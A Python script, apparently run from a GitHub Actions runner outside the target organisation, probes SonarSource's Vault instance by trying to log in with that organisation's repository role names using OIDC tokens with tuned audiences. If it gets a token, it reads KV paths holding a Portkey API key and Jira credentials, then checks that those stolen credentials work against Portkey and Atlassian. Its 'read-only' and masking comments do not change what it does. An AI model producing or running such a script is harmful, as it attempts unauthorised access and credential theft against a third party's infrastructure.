#!/usr/bin/env python3
"""Read-only probe #3 (11978): Vault jwt-ghwf role-existence x bound_audiences x bound_claims.

Round 1 (run 43183520806) showed: no role => 400 "missing role" (no default_role);
10 public-SonarSource-repo role names => 400 "error validating token: invalid audience (aud)
claim" (not "role could not be found"), with our aud=https://vault.sonar.build.

Hypothesis: those roles exist and their bound_audiences is the GitHub *default* audience that
hashicorp/vault-action v4.0.0 (used by vault-action-wrapper) produces, i.e. an owner-derived URL
(https://github.com/SonarSource), NOT the Vault URL.

This probe (strictly read-only, tiny bounded matrix):
  - fetch our own OIDC JWT with (a) no audience, (b) aud=https://github.com/SonarSource,
    (c) aud=SonarSource -- just to read which aud GitHub actually puts in the token
  - POST /v1/auth/jwt-ghwf/login <=6 times: 2 known-existing role names x 2 tokens,
    1 protected variant, 1 guaranteed-nonexistent control role (to re-confirm role lookup order)
  - only if a client_token is issued: capabilities-self + lookup-self + <=1 exact KV read/path
    (masked) + <=1 minimal read-only validation. No writes/enumeration/brute force.
"""
import base64
import json
import os
import socket
import time
import urllib.error
import urllib.parse
import urllib.request

VAULT = "https://vault.sonar.build"
RESULT = {"probe": "vault-role-exists-aud-claims-11978"}
AUD_GH_OWNER = "https://github.com/SonarSource"
AUD_BARE = "SonarSource"
CONTROL_ROLE = "github-sonarsource-zz-nonexistent-11978-%d" % (int(time.time()) % 100000)


def log(*a):
    print(*a, flush=True)


def mask(v):
    if v is None:
        return None
    v = str(v)
    return "****" if len(v) <= 8 else v[:4] + "****" + v[-4:] + f" (len={len(v)})"


def http(method, url, data=None, headers=None, timeout=25):
    h = {"User-Agent": "oidc-vault-probe/3.0"}
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        if isinstance(data, (dict, list)):
            body = json.dumps(data).encode()
            h.setdefault("Content-Type", "application/json")
        else:
            body = data if isinstance(data, bytes) else str(data).encode()
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "ms": int((time.time() - t0) * 1000),
                    "body": r.read(300000)}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "ms": int((time.time() - t0) * 1000),
                "body": e.read(300000)}
    except Exception as e:
        return {"status": None, "ms": int((time.time() - t0) * 1000),
                "error": f"{type(e).__name__}: {str(e)[:300]}"}


def jbody(r):
    try:
        return json.loads(r["body"].decode("utf-8", "replace")) if r.get("body") else None
    except Exception:
        return {"_raw": (r.get("body") or b"")[:3000].decode("utf-8", "replace")}


def errs(j):
    if isinstance(j, dict):
        if isinstance(j.get("errors"), list):
            return "; ".join(str(x) for x in j["errors"])[:800]
        if "error" in j:
            return str(j["error"])[:800]
        return json.dumps(j)[:800]
    return str(j)[:800]


def decode_jwt(t):
    seg = t.split(".")[1]
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))


def get_oidc(aud=None):
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not url or not tok:
        return None, "no id-token env"
    u = url + ("&" if "?" in url else "?") + "audience=" + urllib.parse.quote(aud) if aud else url
    r = http("GET", u, headers={"Authorization": "Bearer " + tok, "Accept": "application/json"})
    if r["status"] != 200:
        return None, {"status": r["status"], "error": r.get("error"), "body": jbody(r)}
    return json.loads(r["body"].decode())["value"], None


def claims_of(jwt):
    out = {}
    try:
        c = decode_jwt(jwt)
        for k in ("iss", "aud", "sub", "repository", "repository_owner", "repository_id",
                  "ref", "ref_type", "environment", "job_workflow_ref", "event_name", "actor"):
            out[k] = c.get(k)
    except Exception as e:
        out["_decode_error"] = str(e)
    return out


def login(role, jwt):
    payload = {"jwt": jwt}
    if role is not None:
        payload["role"] = role
    r = http("POST", VAULT + "/v1/auth/jwt-ghwf/login", data=payload, timeout=25)
    j = jbody(r)
    out = {"role": role, "status": r["status"], "ms": r["ms"], "error": r.get("error")}
    tok = None
    if isinstance(j, dict) and isinstance(j.get("auth"), dict):
        tok = j["auth"].get("client_token")
        out["state"] = "TOKEN_ISSUED"
        out["policies"] = j["auth"].get("policies")
        out["ttl"] = j["auth"].get("lease_duration")
        out["meta"] = {k: ("<present>" if k in ("client_token",) else v) for k, v in
                       (j["auth"].get("metadata") or {}).items()}
    else:
        e = errs(j)
        out["vault_error"] = e
        low = e.lower()
        if "could not be found" in low or "unknown role" in low:
            out["state"] = "ROLE_NOT_FOUND"
        elif "audience" in low:
            out["state"] = "AUD_MISMATCH"
        elif "claim" in low or "subject" in low or "does not match" in low:
            out["state"] = "CLAIMS_MISMATCH"
        else:
            out["state"] = "OTHER_ERROR"
    return out, tok


def main():
    RESULT["control_role"] = CONTROL_ROLE
    RESULT["sys_health"] = {"status": None}
    h = http("GET", VAULT + "/v1/sys/health", timeout=25)
    hj = jbody(h)
    RESULT["sys_health"] = {"status": h["status"], "version": (hj or {}).get("version") if isinstance(hj, dict) else None}
    try:
        infos = socket.getaddrinfo("vault.sonar.build", 443, proto=socket.IPPROTO_TCP)
        RESULT["dns_vault"] = sorted({i[4][0] for i in infos})
    except Exception as e:
        RESULT["dns_vault"] = [f"err {e}"]

    r = http("GET", "https://api.ipify.org?format=json", timeout=15)
    RESULT["egress"] = jbody(r)

    tokens = {}
    for label, aud in (("default", None), ("gh_owner", AUD_GH_OWNER), ("bare", AUD_BARE)):
        j, e = get_oidc(aud)
        tokens[label] = j
        RESULT.setdefault("tokens", {})[label] = {"aud_requested": aud, "ok": bool(j),
                                                  "error": e if isinstance(e, str) else (e or {}).get("body"),
                                                  "claims": claims_of(j) if j else None}

    matrix = []
    token_used = None

    def run(label, role, tok, note=""):
        nonlocal token_used
        if not tok:
            matrix.append({"token": label, "role": role, "state": "NO_TOKEN", "note": note})
            return None
        o, tk = login(role, tok)
        o["token"] = label
        if note:
            o["note"] = note
        matrix.append(o)
        if tk and not token_used:
            token_used = tk
        return o["state"]

    # 1) key probe: existing role name with owner-derived audience
    s1 = run("gh_owner", "github-sonarsource-sonar-java", tokens.get("gh_owner"), "key probe")
    # 2) protected variant
    s2 = run("gh_owner", "github-sonarsource-sonar-java-protected", tokens.get("gh_owner"), "protected variant")
    # 3) guaranteed nonexistent control role, same token/audience -> re-confirm role-lookup order
    run("gh_owner", CONTROL_ROLE, tokens.get("gh_owner"), "nonexistent control")
    # 4) same existing role with GitHub default audience (ours = cballk owner)
    run("default", "github-sonarsource-sonar-java", tokens.get("default"), "default aud control")
    # 5) a second repo, non-protected
    run("gh_owner", "github-sonarsource-sonarlint-vscode", tokens.get("gh_owner"), "second repo")
    # 6) only if owner-derived audience still mismatched: try the bare org-name audience
    if s1 == "AUD_MISMATCH":
        run("bare", "github-sonarsource-sonar-java", tokens.get("bare"), "bare org aud fallback")

    RESULT["matrix"] = matrix

    if token_used:
        H = {"X-Vault-Token": token_used}
        paths = ["development/kv/data/code-security-diff-val-claude-code", "development/kv/data/jira"]
        cap = http("POST", VAULT + "/v1/sys/capabilities-self", data={"paths": paths}, headers=H, timeout=20)
        RESULT["capabilities_self"] = {"status": cap["status"], "json": jbody(cap)}
        lk = http("GET", VAULT + "/v1/auth/token/lookup-self", headers=H, timeout=20)
        lj = jbody(lk)
        if isinstance(lj, dict) and isinstance(lj.get("data"), dict):
            lj = {"data": {k: lj["data"].get(k) for k in ("display_name", "policies", "ttl", "meta")}}
        RESULT["lookup_self"] = {"status": lk["status"], "json": lj}
        caps = {}
        cd = RESULT["capabilities_self"].get("json") or {}
        blob = cd.get("data") if isinstance(cd, dict) else None
        if isinstance(blob, dict):
            caps = {k: v for k, v in blob.items()}
        kv = {}
        for path in paths:
            allowed = None
            for k, v in caps.items():
                if path in k or k in path:
                    allowed = "read" in (v or [])
            if allowed is False:
                kv[path] = {"skipped": "no read in capabilities-self"}
                continue
            rr = http("GET", f"{VAULT}/v1/{path}", headers=H, timeout=20)
            j = jbody(rr)
            item = {"status": rr["status"]}
            if isinstance(j, dict) and isinstance(j.get("data"), dict):
                dd = j["data"].get("data") if isinstance(j["data"].get("data"), dict) else j["data"]
                item["keys"] = sorted(dd.keys())[:20] if isinstance(dd, dict) else None
                item["masked"] = {k: (mask(v) if isinstance(v, str) else "<non-str>") for k, v in dd.items()} if isinstance(dd, dict) else None
                if isinstance(dd, dict) and dd.get("portkey-api-key"):
                    RESULT["_portkey"] = dd["portkey-api-key"]
                if isinstance(dd, dict) and dd.get("token"):
                    RESULT["_jira"] = (dd.get("user"), dd.get("token"))
            else:
                item["resp"] = j
            kv[path] = item
        RESULT["kv_read"] = kv
        if RESULT.get("_portkey"):
            key = RESULT.pop("_portkey")
            v = http("GET", "https://api.portkey.ai/v1/models", headers={"x-portkey-api-key": key}, timeout=25)
            jj = jbody(v)
            RESULT["portkey_validate"] = {"status": v["status"],
                                          "model_count": len(jj["data"]) if isinstance(jj, dict) and isinstance(jj.get("data"), list) else None}
        if RESULT.get("_jira"):
            user, tok = RESULT.pop("_jira")
            basic = base64.b64encode(f"{user}:{tok}".encode()).decode()
            v = http("GET", "https://sonarsource.atlassian.net/rest/api/3/myself",
                     headers={"Authorization": "Basic " + basic}, timeout=25)
            jj = jbody(v)
            RESULT["jira_validate"] = {"status": v["status"],
                                       "identity": ({"accountId_present": bool(jj.get("accountId")),
                                                     "displayName": jj.get("displayName"),
                                                     "accountType": jj.get("accountType")} if isinstance(jj, dict) else None)}

    log("===RESULT_JSON_START===")
    log(json.dumps(RESULT, indent=1, default=str))
    log("===RESULT_JSON_END===")


if __name__ == "__main__":
    main()
